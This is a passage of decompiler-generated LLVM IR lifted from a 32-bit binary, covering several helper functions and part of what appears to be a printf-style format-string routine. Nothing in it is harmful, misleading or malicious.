  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_d87c.dec_label_pc_d88c_crit_edge ], [ 0, %dec_label_pc_d810 ]
  store i32 ptrtoint (i32** @global_var_1810c.329 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_d8ac4 = icmp eq i32 %storemerge12, 0
  br i1 %v2_d8ac4, label %dec_label_pc_d8b4, label %dec_label_pc_d898

dec_label_pc_d898:                                ; preds = %dec_label_pc_d88c, %dec_label_pc_d898
  %v0_d8a0 = phi i32 [ %storemerge1, %dec_label_pc_d898 ], [ %storemerge12, %dec_label_pc_d88c ]
  %v1_d898 = inttoptr i32 %v0_d8a0 to i8*
  %v2_d898 = load i8, i8* %v1_d898, align 1
  %v3_d898 = zext i8 %v2_d898 to i32
  store i32 %v3_d898, i32* %r3.global-to-local, align 4
  %v1_d89c = and i32 %v3_d898, 64
  store i32 %v0_d8a0, i32* %r0.global-to-local, align 4
  store i32 55464, i32* @lr, align 4
  %v1_d8a4 = icmp ne i32 %v1_d89c, 0
  call void @__pseudo_cond_branch(i1 %v1_d8a4, i32 ptrtoint (i32* @global_var_d8c8.340 to i32))
  %v0_d8a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_d8a8 = add i32 %v0_d8a8, 32
  %v2_d8a8 = inttoptr i32 %v1_d8a8 to i32*
  %storemerge1 = load i32, i32* %v2_d8a8, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_d8ac = icmp eq i32 %storemerge1, 0
  br i1 %v2_d8ac, label %dec_label_pc_d8ac.dec_label_pc_d8b4_crit_edge, label %dec_label_pc_d898

dec_label_pc_d8ac.dec_label_pc_d8b4_crit_edge:    ; preds = %dec_label_pc_d898
  %v11_d8b4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d8b4

dec_label_pc_d8b4:                                ; preds = %dec_label_pc_d8ac.dec_label_pc_d8b4_crit_edge, %dec_label_pc_d88c
  %v11_d8b4 = phi i32 [ %v11_d8b4.pre, %dec_label_pc_d8ac.dec_label_pc_d8b4_crit_edge ], [ %v11_d8b413, %dec_label_pc_d88c ]
  %v2_d8b4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_d8b4, i32* @r4, align 4
  ret i32 %v11_d8b4

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 ()* @function_d800, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_d898, { 1, 0 }
  uselistorder label %dec_label_pc_d86c, { 1, 0 }
  uselistorder label %dec_label_pc_d830, { 1, 0 }
}

define i32 @function_d8c8() local_unnamed_addr {
dec_label_pc_d8c8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d8c8 = load i32, i32* @r4, align 4
  store i32 %v3_d8c8, i32* %stack_var_-8, align 4
  %v0_d8cc = load i32, i32* @r0, align 4
  %v1_d8cc = add i32 %v0_d8cc, 8
  %v2_d8cc = inttoptr i32 %v1_d8cc to i32*
  %v3_d8cc = load i32, i32* %v2_d8cc, align 4
  %v1_d8d0 = add i32 %v0_d8cc, 16
  %v2_d8d0 = inttoptr i32 %v1_d8d0 to i32*
  %v3_d8d0 = load i32, i32* %v2_d8d0, align 4
  %v9_d8d4 = icmp eq i32 %v3_d8d0, %v3_d8cc
  store i32 %v0_d8cc, i32* %r4.global-to-local, align 4
  br i1 %v9_d8d4, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_d8c8
  store i32 %v3_d8cc, i32* %v2_d8d0, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_d8c8, %bb
  store i32 55528, i32* @lr, align 4
  %v1_d8e4 = xor i1 %v9_d8d4, true
  call void @__pseudo_cond_branch(i1 %v1_d8e4, i32 ptrtoint (i32* @global_var_11684.341 to i32))
  %v0_d8e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_d8e8 = add i32 %v0_d8e8, 8
  %v2_d8e8 = inttoptr i32 %v1_d8e8 to i32*
  %v3_d8e8 = load i32, i32* %v2_d8e8, align 4
  %v1_d8ec = add i32 %v0_d8e8, 16
  %v2_d8ec = inttoptr i32 %v1_d8ec to i32*
  %v3_d8ec = load i32, i32* %v2_d8ec, align 4
  %v2_d8f0 = sub i32 %v3_d8ec, %v3_d8e8
  %v2_d8f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d8f4, i32* @r4, align 4
  ret i32 %v2_d8f0

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_d8f8(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d8f8:
  %stack_var_-17 = alloca i8, align 1
  %v3_d8f8 = load i32, i32* @r4, align 4
  %v6_d8f8 = load i32, i32* @r5, align 4
  %v9_d8f8 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_d9182 = icmp eq i32 %arg3, 0
  %v2_d91c = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_d9182, label %dec_label_pc_d938, label %dec_label_pc_d92c

dec_label_pc_d914:                                ; preds = %dec_label_pc_d92c
  %v1_d914 = add i32 %v0_d914, -1
  store i32 %v1_d914, i32* @r4, align 4
  %v2_d918 = icmp eq i32 %v1_d914, 0
  %v0_d924 = load i32, i32* @r6, align 4
  br i1 %v2_d918, label %dec_label_pc_d938.loopexit, label %dec_label_pc_d92c

dec_label_pc_d92c:                                ; preds = %dec_label_pc_d8f8, %dec_label_pc_d914
  %v0_d9244 = phi i32 [ %v0_d924, %dec_label_pc_d914 ], [ %arg1, %dec_label_pc_d8f8 ]
  %v3_d92c = call i32 @function_11740(i32 %v2_d91c, i32 1, i32 %v0_d9244)
  %v7_d930 = icmp eq i32 %v3_d92c, 1
  %v0_d914 = load i32, i32* @r4, align 4
  br i1 %v7_d930, label %dec_label_pc_d914, label %dec_label_pc_d938.loopexit

dec_label_pc_d938.loopexit:                       ; preds = %dec_label_pc_d914, %dec_label_pc_d92c
  %v0_d938.ph = phi i32 [ %v0_d914, %dec_label_pc_d92c ], [ 0, %dec_label_pc_d914 ]
  %v1_d938.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d938

dec_label_pc_d938:                                ; preds = %dec_label_pc_d938.loopexit, %dec_label_pc_d8f8
  %v1_d938 = phi i32 [ 0, %dec_label_pc_d8f8 ], [ %v1_d938.pre, %dec_label_pc_d938.loopexit ]
  %v0_d938 = phi i32 [ 0, %dec_label_pc_d8f8 ], [ %v0_d938.ph, %dec_label_pc_d938.loopexit ]
  %v2_d938 = sub i32 %v1_d938, %v0_d938
  store i32 %v3_d8f8, i32* @r4, align 4
  store i32 %v6_d8f8, i32* @r5, align 4
  store i32 %v9_d8f8, i32* @r6, align 4
  ret i32 %v2_d938

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_d938.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_d92c, { 1, 0 }
}

define i32 @function_d944(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d944:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d944 = load i32, i32* @r4, align 4
  store i32 %v3_d944, i32* %stack_var_-24, align 4
  %v9_d944 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_d94c = and i32 %arg2, 128
  %v2_d94c = icmp eq i32 %v1_d94c, 0
  %v0_d950 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d950, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_d94c, label %bb, label %dec_label_pc_d964

bb:                                               ; preds = %dec_label_pc_d944
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d9a4

dec_label_pc_d964:                                ; preds = %dec_label_pc_d944
  store i32 %arg4, i32* @r0, align 4
  %v0_d968 = call i32 @function_f030()
  store i32 %v0_d968, i32* %r0.global-to-local, align 4
  %v1_d96c = load i32, i32* %r4.global-to-local, align 4
  %v2_d96c = sub i32 %v1_d96c, %v0_d968
  store i32 %v2_d96c, i32* @r4, align 4
  store i32 %v0_d968, i32* @r5, align 4
  %tmp15 = icmp slt i32 %v2_d96c, 1
  br i1 %tmp15, label %.thread, label %dec_label_pc_d984

.thread:                                          ; preds = %dec_label_pc_d964
  store i32 %v0_d968, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d9a4

dec_label_pc_d984:                                ; preds = %dec_label_pc_d964
  %v0_d984 = load i32, i32* @r6, align 4
  %v1_d984 = urem i32 %v0_d984, 128
  %v0_d988 = load i32, i32* @r8, align 4
  store i32 %v0_d988, i32* %r0.global-to-local, align 4
  %v3_d990 = trunc i32 %v1_d984 to i8
  %v4_d990 = call i32 @function_d8f8(i32 %v0_d988, i8 %v3_d990, i32 %v2_d96c)
  store i32 %v4_d990, i32* %r0.global-to-local, align 4
  %v1_d994 = load i32, i32* @r4, align 4
  %v9_d994 = icmp eq i32 %v4_d990, %v1_d994
  store i32 %v4_d990, i32* %r6.global-to-local, align 4
  br i1 %v9_d994, label %dec_label_pc_d9a0, label %dec_label_pc_d9c0

dec_label_pc_d9a0:                                ; preds = %dec_label_pc_d984
  %v0_d9a0 = load i32, i32* @r5, align 4
  store i32 %v0_d9a0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d9a4

dec_label_pc_d9a4:                                ; preds = %bb, %.thread, %dec_label_pc_d9a0
  %v5_d9b0 = phi i32 [ %v0_d9a0, %dec_label_pc_d9a0 ], [ %arg3, %bb ], [ %v0_d968, %.thread ]
  %tmp16 = icmp slt i32 %v5_d9b0, 1
  br i1 %tmp16, label %.thread8, label %bb17

.thread8:                                         ; preds = %dec_label_pc_d9a4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_d9a4
  %v5_d9ac = load i32, i32* @r7, align 4
  br label %bb18

bb18:                                             ; preds = %.thread8, %bb17
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_d9ac, %bb17 ]
  %tmp19 = phi i1 [ false, %.thread8 ], [ true, %bb17 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp19, i32 ptrtoint (i32* @global_var_11740.342 to i32))
  %v0_d9bc = load i32, i32* %r6.global-to-local, align 4
  %v2_d9bc = add i32 %storemerge, %v0_d9bc
  store i32 %v2_d9bc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d9c0

dec_label_pc_d9c0:                                ; preds = %dec_label_pc_d984, %bb18
  %v0_d9c0 = phi i32 [ %v4_d990, %dec_label_pc_d984 ], [ %v2_d9bc, %bb18 ]
  store i32 %v0_d9c0, i32* %r0.global-to-local, align 4
  %v2_d9c4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d9c4, i32* %r4.global-to-local, align 4
  store i32 %v9_d944, i32* %r6.global-to-local, align 4
  ret i32 %v0_d9c0

; uselistorder directives
  uselistorder i32 %v0_d9c0, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 6, 1, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_d9c0, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_d9a4, { 2, 1, 0 }
}

define i32 @function_d9c8(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
dec_label_pc_d9c8:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_d9c8 = load i32, i32* @r4, align 4
  store i32 %v3_d9c8, i32* %stack_var_-36, align 4
  %v6_d9c8 = load i32, i32* @r5, align 4
  %v15_d9c8 = load i32, i32* @r8, align 4
  %v18_d9c8 = load i32, i32* @sb, align 4
  %v21_d9c8 = load i32, i32* @sl, align 4
  %v24_d9c8 = load i32, i32* @fp, align 4
  %v2_d9d0 = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_d9d0, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_d9d0, i32* %r0.global-to-local, align 4
  %v0_d9dc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_d9dc, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_d9e4 = call i32 @function_dfbc(i32* nonnull %stack_var_-332)
  store i32 %v2_d9e4, i32* %r0.global-to-local, align 4
  %v1_d9e8 = icmp slt i32 %v2_d9e4, 0
  br i1 %v1_d9e8, label %dec_label_pc_d9f0, label %dec_label_pc_da24

dec_label_pc_d9f0:                                ; preds = %dec_label_pc_d9c8
  %v3_d9f0 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_d9f0, i32* @r4, align 4
  store i32 %v3_d9f0, i32* @r0, align 4
  %v0_d9f8 = call i32 @function_f030()
  store i32 %v0_d9f8, i32* %r0.global-to-local, align 4
  %v2_d9fc = icmp eq i32 %v0_d9f8, 0
  br i1 %v2_d9fc, label %bb, label %dec_label_pc_da0c

bb:                                               ; preds = %dec_label_pc_d9f0
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_df9c

dec_label_pc_da0c:                                ; preds = %dec_label_pc_d9f0
  %v0_da0c = load i32, i32* @r4, align 4
  store i32 %v0_da0c, i32* %r0.global-to-local, align 4
  %v0_da10 = load i32, i32* @fp, align 4
  store i32 %v0_da10, i32* %r2.global-to-local, align 4
  %v3_da14 = call i32 @function_11740(i32 %v0_da0c, i32 %v0_d9f8, i32 %v0_da10)
  store i32 %v3_da14, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_df9c

dec_label_pc_da24:                                ; preds = %dec_label_pc_d9c8
  store i32 %v2_d9d0, i32* %r0.global-to-local, align 4
  %v0_da28 = load i32, i32* @r5, align 4
  %v2_da2c = call i32 @function_e054(i32 %v2_d9d0, i32 %v0_da28)
  store i32 %v2_da2c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  %v4_dacc = zext i8 %tmp104 to i32
  %v2_dad4 = ptrtoint i32* %stack_var_-252 to i32
  %v2_daf4 = ptrtoint i32* %stack_var_-36 to i32
  %v2_db0c = icmp eq i32 %tmp102, 0
  %v1_db20 = inttoptr i32 %tmp101 to i32*
  %v2_de10 = ptrtoint i32* %stack_var_-180 to i32
  %v2_dd2c = ptrtoint i32* %stack_var_-44 to i32
  %v2_dd40 = ptrtoint i32* %stack_var_-52 to i32
  %v3_dcdc = add i32 %tmp101, 4
  %v4_dcdc = inttoptr i32 %v3_dcdc to i32*
  %v2_dce0 = ptrtoint i32* %stack_var_-328 to i32
  %v7_dba0 = zext i8 %tmp99 to i32
  %v2_dbdc = ptrtoint i32* %stack_var_-53 to i32
  %v5_dbe4 = bitcast i32* %stack_var_-53 to i8*
  %v2_dbec = icmp ugt i32 %tmp102, 4
  %v7_dbec = icmp eq i32 %tmp102, 5
  %v0_df84.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_db04187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_dd00 = icmp ugt i32 %tmp102, 16
  %v7_dd00 = icmp eq i32 %tmp102, 17
  %v2_dd04 = xor i1 %v7_dd00, true
  %v3_dd04 = and i1 %v2_dd00, %v2_dd04
  %v2_dda0 = icmp ugt i32 %tmp102, 18
  %v7_dda0 = icmp eq i32 %tmp102, 19
  %v2_dda4 = xor i1 %v7_dda0, true
  %v3_dda4 = and i1 %v2_dda0, %v2_dda4
  %v7_de04 = icmp eq i32 %tmp102, 20
  %v2_db44 = add i32 %tmp102, ptrtoint (i32* @global_var_16268.344 to i32)
  %v1_db48 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_16268.344 to i32), i32 -1)
  %v2_db48 = inttoptr i32 %v1_db48 to i8*
  %v2_db74 = xor i1 %v7_dbec, true
  %v3_db74 = and i1 %v2_dbec, %v2_db74
  %v7_dba8 = icmp eq i32 %tmp102, 1
  %v2_dbf4 = xor i1 %v2_dbec, true
  %v3_dbf4 = or i1 %v7_dbec, %v2_dbf4
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_dc5c = icmp eq i32 %tmp102, 3
  %v11_dc68 = icmp eq i32 %tmp102, 4
  %v9_dad8 = mul nuw nsw i32 %v4_dacc, 8
  %v10_dad8 = add nsw i32 %v9_dad8, -8
  %v6_dae0 = add i32 %v10_dad8, %v2_dad4
  br label %dec_label_pc_df84

bb126:                                            ; preds = %dec_label_pc_da3c.outer, %.thread7
  %v2_da3c185 = phi i8 [ %v2_da3c, %.thread7 ], [ %v2_da3c181, %dec_label_pc_da3c.outer ]
  %v1_da50184 = phi i32 [ %v2_da50, %.thread7 ], [ %v0_da3c49, %dec_label_pc_da3c.outer ]
  %v8_da44 = icmp eq i8 %v2_da3c185, 37
  br i1 %v8_da44, label %dec_label_pc_da58, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_da50 = add i32 %v1_da50184, 1
  store i32 %v2_da50, i32* @r4, align 4
  %v1_da3c = inttoptr i32 %v2_da50 to i8*
  %v2_da3c = load i8, i8* %v1_da3c, align 1
  %v3_da3c = zext i8 %v2_da3c to i32
  store i32 %v3_da3c, i32* %r3.global-to-local, align 4
  %v2_da40 = icmp eq i8 %v2_da3c, 0
  br i1 %v2_da40, label %dec_label_pc_da58, label %bb126

dec_label_pc_da58:                                ; preds = %bb126, %.thread7, %dec_label_pc_da3c.outer
  %v1_da50.lcssa = phi i32 [ %v0_da3c49, %dec_label_pc_da3c.outer ], [ %v2_da50, %.thread7 ], [ %v1_da50184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_da58 = sub i32 %v1_da50.lcssa, %v5_da68
  %v9_da58 = icmp eq i32 %v1_da50.lcssa, %v5_da68
  br i1 %v9_da58, label %dec_label_pc_da8c, label %dec_label_pc_da60

dec_label_pc_da60:                                ; preds = %dec_label_pc_da58
  store i32 %v2_da58, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_da58, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_da60
  store i32 %v5_da68, i32* %r0.global-to-local, align 4
  %v5_da70 = load i32, i32* @fp, align 4
  store i32 %v5_da70, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_da60, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_da60 ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_11740.342 to i32))
  %v0_da78 = load i32, i32* %r0.global-to-local, align 4
  %v1_da78 = load i32, i32* @r5, align 4
  %v9_da78 = icmp eq i32 %v0_da78, %v1_da78
  br i1 %v9_da78, label %dec_label_pc_da80, label %dec_label_pc_df94

dec_label_pc_da80:                                ; preds = %bb130
  %v2_da84 = add i32 %v0_da78, %stack_var_-336.1.ph
  store i32 %v2_da84, i32* @lr, align 4
  %v0_da8c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_da8c

dec_label_pc_da8c:                                ; preds = %dec_label_pc_da58, %dec_label_pc_da80
  %v0_daa0 = phi i32 [ %v5_da68, %dec_label_pc_da58 ], [ %v0_da8c.pre, %dec_label_pc_da80 ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_da58 ], [ %v2_da84, %dec_label_pc_da80 ]
  %v1_da8c = inttoptr i32 %v0_daa0 to i8*
  %v2_da8c = load i8, i8* %v1_da8c, align 1
  %v3_da8c = zext i8 %v2_da8c to i32
  store i32 %v3_da8c, i32* %r3.global-to-local, align 4
  %v2_da90 = icmp eq i8 %v2_da8c, 0
  br i1 %v2_da90, label %dec_label_pc_df9c, label %dec_label_pc_da98

dec_label_pc_da98:                                ; preds = %dec_label_pc_da8c
  %v1_da98 = add i32 %v0_daa0, 1
  %v2_da98 = inttoptr i32 %v1_da98 to i8*
  %v3_da98 = load i8, i8* %v2_da98, align 1
  %v4_da98 = zext i8 %v3_da98 to i32
  store i32 %v4_da98, i32* %r3.global-to-local, align 4
  %v7_da9c = icmp eq i8 %v3_da98, 37
  store i32 %v1_da98, i32* %r2.global-to-local, align 4
  br i1 %v7_da9c, label %dec_label_pc_df8c, label %dec_label_pc_daa8

dec_label_pc_daa8:                                ; preds = %dec_label_pc_da98
  store i32 %v2_d9d0, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d9d0, i32* %r0.global-to-local, align 4
  store i32 %v1_da98, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_dabc = call i32 @function_e274(i32* nonnull %stack_var_-332)
  store i32 %v2_d9d0, i32* @r0, align 4
  %v0_dac4 = call i32 @function_e08c()
  store i32 %v0_dac4, i32* %r0.global-to-local, align 4
  store i32 %v4_dacc, i32* @ip, align 4
  store i32 %v2_dad4, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_daa8
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_daa8
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_dae0, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_daec78 = phi i32 [ %v6_dae0, %bb133 ], [ %v2_dad4, %.thread ]
  store i32 %v2_daf4, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_db04187, label %dec_label_pc_daec, label %dec_label_pc_db08

dec_label_pc_daec:                                ; preds = %bb134, %dec_label_pc_daec
  %v5_dafc189 = phi i32 [ %v5_dafc, %dec_label_pc_daec ], [ %v2_daf4, %bb134 ]
  %v0_daec188 = phi i32 [ %v1_daf0, %dec_label_pc_daec ], [ %v0_daec78, %bb134 ]
  %v2_daec = add i32 %v5_dafc189, -4
  %v3_daec = inttoptr i32 %v2_daec to i32*
  store i32 %v0_daec188, i32* %v3_daec, align 4
  %v0_daf0 = load i32, i32* %r3.global-to-local, align 4
  %v1_daf0 = add i32 %v0_daf0, 8
  store i32 %v1_daf0, i32* %r3.global-to-local, align 4
  %v0_daf8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_daf8.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_daf4, i32* @lr, align 4
  %v4_dafc = mul i32 %v0_daf8.pre, 4
  %v5_dafc = add i32 %v4_dafc, %v2_daf4
  %v1_db00 = add i32 %v0_daf8.pre, 1
  store i32 %v1_db00, i32* %r2.global-to-local, align 4
  %v5_db04 = icmp slt i32 %v0_daf8.pre, %v1_daf8.pre
  br i1 %v5_db04, label %dec_label_pc_daec, label %dec_label_pc_db08

dec_label_pc_db08:                                ; preds = %dec_label_pc_daec, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_db0c, label %dec_label_pc_db14, label %dec_label_pc_db38

dec_label_pc_db14:                                ; preds = %dec_label_pc_db08
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* @ip, align 4
  %v2_db20 = load i32, i32* %v1_db20, align 4
  store i32 %v2_db20, i32* %r0.global-to-local, align 4
  %v1_db24 = and i32 %v0_db68, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_db2c = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_db2c, i32* %r3.global-to-local, align 4
  %v4_db30 = inttoptr i32 %v2_db20 to i8*
  %v5_db30 = call i32 @function_119ec(i8* %v4_db30, i32 %v1_db24, i32 %stack_var_-336.2, i32 %v3_db2c)
  store i32 %v5_db30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_df80

dec_label_pc_db38:                                ; preds = %dec_label_pc_db08
  br i1 %tmp195, label %dec_label_pc_dcc4, label %dec_label_pc_db40

dec_label_pc_db40:                                ; preds = %dec_label_pc_db38
  store i32 %v2_db44, i32* %r3.global-to-local, align 4
  %v3_db48 = load i8, i8* %v2_db48, align 1
  %v4_db48 = zext i8 %v3_db48 to i32
  store i32 %v4_db48, i32* @r4, align 4
  %v7_db4c = icmp eq i8 %v3_db48, 10
  br i1 %v7_db4c, label %dec_label_pc_db58, label %bb135

bb135:                                            ; preds = %dec_label_pc_db40
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_db58:                                ; preds = %dec_label_pc_db40
  store i32 %v0_db68, i32* %r3.global-to-local, align 4
  %v1_db5c = and i32 %v0_db68, 32
  %v2_db5c = icmp eq i32 %v1_db5c, 0
  %.175 = select i1 %v2_db5c, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_db68 = and i32 %v0_db68, 64
  %v2_db68 = icmp eq i32 %v1_db68, 0
  br i1 %v2_db68, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_db58
  %.176 = select i1 %v2_db5c, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_db58, %bb138
  br i1 %v3_db74, label %.thread84, label %dec_label_pc_db7c

.thread84:                                        ; preds = %bb139
  %v5_db74 = sub nsw i32 0, %v4_db48
  store i32 %v5_db74, i32* @r4, align 4
  br label %dec_label_pc_db94

dec_label_pc_db7c:                                ; preds = %bb139
  br i1 %v7_dc5c, label %bb140, label %dec_label_pc_db88

bb140:                                            ; preds = %dec_label_pc_db7c
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_db94

dec_label_pc_db88:                                ; preds = %dec_label_pc_db7c
  br i1 %v7_dba8, label %dec_label_pc_db98, label %dec_label_pc_db94

dec_label_pc_db94:                                ; preds = %.thread84, %bb140, %dec_label_pc_db88
  %v0_dbc086 = phi i32 [ %v5_db74, %.thread84 ], [ %v4_db48, %bb140 ], [ %v4_db48, %dec_label_pc_db88 ]
  br label %dec_label_pc_db98

dec_label_pc_db98:                                ; preds = %dec_label_pc_db88, %dec_label_pc_db94
  %v0_dbc085 = phi i32 [ %v0_dbc086, %dec_label_pc_db94 ], [ %v4_db48, %dec_label_pc_db88 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_db94 ], [ 6, %dec_label_pc_db88 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_db98 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_db98, i32* %r3.global-to-local, align 4
  %v1_db9c = icmp slt i32 %v3_db98, 0
  %v7_dba0. = select i1 %v1_db9c, i32 %v7_dba0, i32 32
  store i32 %v7_dba0., i32* @sb, align 4
  br i1 %v7_dba8, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_db98
  store i32 %v2_daf4, i32* @lr, align 4
  %v2_dbb0 = load i32, i32* @ip, align 4
  %v5_dbb0 = mul i32 %v2_dbb0, 4
  %v6_dbb0 = add i32 %v5_dbb0, %v2_daf4
  store i32 %v6_dbb0, i32* %r3.global-to-local, align 4
  %v2_dbb4 = add i32 %v6_dbb0, -260
  %v3_dbb4 = inttoptr i32 %v2_dbb4 to i32*
  %v4_dbb4 = load i32, i32* %v3_dbb4, align 4
  store i32 %v4_dbb4, i32* %r3.global-to-local, align 4
  %v2_dbbc = and i32 %v4_dbb4, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_db98, %.thread16
  %storemerge94 = phi i32 [ %v2_dbbc, %.thread16 ], [ 1024, %dec_label_pc_db98 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_dbc085, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_dbc8 = call i32 @function_1197c()
  %v0_dbcc = load i32, i32* @r1, align 4
  store i32 %v0_dbcc, i32* %r2.global-to-local, align 4
  %v0_dbd8 = load i32, i32* @r4, align 4
